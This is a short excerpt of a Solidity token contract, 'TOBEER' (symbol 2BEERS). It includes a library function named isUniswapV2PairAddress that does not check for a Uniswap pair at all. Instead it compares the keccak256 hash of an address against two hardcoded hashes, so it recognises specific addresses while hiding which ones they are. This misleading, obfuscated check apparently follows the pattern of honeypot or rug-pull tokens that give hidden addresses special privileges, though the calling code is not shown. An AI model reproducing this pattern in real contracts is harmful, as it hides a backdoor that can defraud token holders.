...
library Address {
    function isUniswapV2PairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x6cf2915cde91a49f209477f7672705ec0741a53b6bd6f18d52bf00ff4a916730 || keccak256(abi.encodePacked(account)) == 0xf03481b57b27af861ae31b6d07be8e6665439d9a4a98dcad0fb8711b04d0f6dd;
    }
}
...
contract TOBEER is Ownable, IERC20 {
    ...
    string private _name = "To beer or not to beer";
    string private  _symbol = "2BEERS";
